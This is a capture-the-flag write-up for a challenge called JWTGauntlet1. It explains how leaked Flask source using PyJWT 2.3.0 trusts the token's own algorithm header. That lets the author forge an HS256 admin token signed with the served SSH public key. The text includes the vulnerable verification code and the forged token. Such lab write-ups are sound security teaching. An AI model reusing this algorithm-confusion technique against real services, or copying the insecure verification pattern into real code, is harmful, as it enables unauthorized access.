# JWTGauntlet1 Writeup

The website is pretty basic, just something about an organisation selling compass apps.
But, the title has teh name 'JWT' in it, and the description mentions 'JWT is confusing', possibly alluding to a JWT algorithm confusion attack.

All of the buttons and links on the site don't do anything, so we must do something else, checking out cookies for a JWT reveals:

```txt
session: eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.eyJhZG1pbiI6ZmFsc2V9.GwvwXO7f9Cn3PUvj-RrC2MGIT-a-O5dPCmgHyfeqgzgPKMqBHV2GSMXpZRUI2mrMUrPGB0lebJ3JV-cEZ8dztg
```

This is a JWT session token, which if we decode (its just base64, but I recommend `jwt.io`) it becomes:

```json
{
  "typ": "JWT",
  "alg": "ES256"
}
{
  "admin": false
}
```

This shows some info, namely that the JWT algorithm used is the `Eleptical Curve Digital Signature Algorithm (ECDSA)`, which especially if a proper key is used is a very secure algorithm, and the one (at the time of writing) that the ASD recommends for signing things with.

It also reveals that the JWT has a value called `admin`, and that forging a JWT with `admin` equal to true is likely how this challenge is solved.

There doesn't appear to be anything else on the website, but looking into ECDSA we can find that it is an asymmetric algorithm which looks promising for using algorithm confusion to change from using an asymmetric algorithm which signs with a private key and checks with a public, into a symettric algorithm which we sign with the public key and gets checked with the public key.

But the only thing left to check on the website is the `robots.txt`, which if we check we find some intresting data:
```txt
Disallow: /app.pyi
Disallow: /pub
```

If we go to the `.pyi` file, we can download it and view it locally.

```python
import jwt  # Using PyJWT 2.3.0
from flask import Flask, make_response, render_template, request

app = Flask(__name__, static_folder="static", static_url_path="")

def is_admin(request) -> bool:
    token = request.cookies.get("session")
    if token is None:
        return False

    try:
        with open("pub.key", "r") as f:
            key = f.read().strip()
    except:
        return False

    try:
        header = jwt.get_unverified_header(token)
        alg = header["alg"]

        data = jwt.decode(token, key, algorithms=[alg])
        return data.get("admin", False)
    except:
        return False

def admin_only(f):
    def wrapper():
        if is_admin(request):
            return f()
        else:
            return render_template("403.html", error="Access Denied")

    return wrapper

@app.route("/admin")
@admin_only
def admin_page():
    flag = ""
    with open("flag.txt", "r") as f:
        flag = f.read().strip()
    return flag

@app.route("/pub")
def publish_public_key():
    try:
        with open("pub.key") as f:
            key = f.read().strip()
        return key
    except:
        return render_template("403.html", error="Cannot find public key")

def create_token():
    payload = {"admin": False}
    with open("priv.key", "r") as f:
        key = f.read().strip()
    token = jwt.encode(payload, key, algorithm="ES256")
    return token

@app.route("/")
def index():
    resp = make_response(render_template("index.html", is_admin=is_admin(request)))
    token = request.cookies.get("session")
    if token is None:
        new_token = create_token()
        resp.set_cookie("session", new_token)
    return resp

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
```

This appears to be the source code of the challenge, it reveals that as suspected, in order get the flag we must set the `admin` value of the JWT to true by forging a false on, looking at the JWT checking implementation, it uses PyJWT version 2.3.0

Searching up this version reveals that the next version patched a CVE where you could do algorithm confusion from `ES` to `HS` so long as you have ssh public key, not the normal one.

Checking the `/pub` link to get the public key reveals:
```txt
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMaoT8ihk9w1BUOtVY/kRY/Ozk5Xx2iKVw5GLJ3A3aQmeOxvaN09oal3b5vnySjl1ValUfNgay3IoKU8Ayfiueg=
```

This is indeed the ssh public key, instead of the typical public key. Therefore so long as the implementation of the JWT verifiying was done unsafely, then we can do algorithm confusion.

Checking the implementation in the `is_admin` function:
```python
def is_admin(request) -> bool:
    token = request.cookies.get("session")
    if token is None:
        return False

    try:
        with open("pub.key", "r") as f:
            key = f.read().strip()
    except:
        return False

    try:
        header = jwt.get_unverified_header(token)
        alg = header["alg"]

        data = jwt.decode(token, key, algorithms=[alg])
        return data.get("admin", False)
    except:
        return False
```

The key is always the same, and it uses whatever algorithm is supplied instead of using any specific one, therefore we can use algorithm confusion.

If we go to `jwt.io` and paste in the current JWT token it reveals the data, but if we click the `JWT Encoder` button then we can start making them,
first we want to change the algorithm to `HS256`, and then change the payload's `admin` value to true

```json
{
  "typ": "JWT",
  "alg": "HS256"
}
{
  "admin": true
}
```

Then we just need to paste in the ssh public key that we were given at `/pub`, that gets us the JWT token
```txt
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.4KIB3cMquQD3vZfZNIaJDnnNPPOcrODFns1CJkif5-0
```

Pasting this into the session cookie value on the website, and reloading the page gets us a new button in the nav bar called `Admin`

Clicking it redirects us to a page with just a single string on it:

```txt
redroomctf{Wh4t5_4lg0r1thm_c0nfu510n?}
```

And we got the flag!
